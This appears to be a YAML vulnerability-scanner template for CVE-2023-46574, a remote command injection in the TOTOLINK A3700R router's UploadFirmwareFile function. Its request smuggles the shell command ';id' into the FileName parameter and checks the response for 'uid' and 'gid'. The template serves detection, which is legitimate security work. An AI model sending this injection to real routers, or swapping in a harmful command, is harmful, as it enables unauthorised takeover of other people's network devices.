id: CVE-2023-46574

info:
  name: TOTOLINK A3700R存在RCE漏洞
  author: Y3y1ng
  severity: critical
  verified: false
  description: |-
    TOTOLINK A3700R v9.1.2u.6165_20211012版本存在命令执行漏洞，攻击者可利用该漏洞通过UploadFirmwareFile函数的FileName参数执行任意代码。
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-46574
    - https://github.com/OraclePi/repo/blob/main/totolink%20A3700R/1/A3700R%20%20V9.1.2u.6165_20211012%20vuln.md
  tags: TOTOLINK,RCE
  created: 2023/12/10

rules:
  r0:
    request:
      method: GET
      path: /cgi-bin/cstecgi.cgi
      body: |
        {
        "topicurl":"UploadFirmwareFile",
        "FileName":";id"
        }
    expression: |
      response.status == 200 &&
      response.body.bcontains(b"uid") &&
      response.body.bcontains(b"gid") 
expression: r0()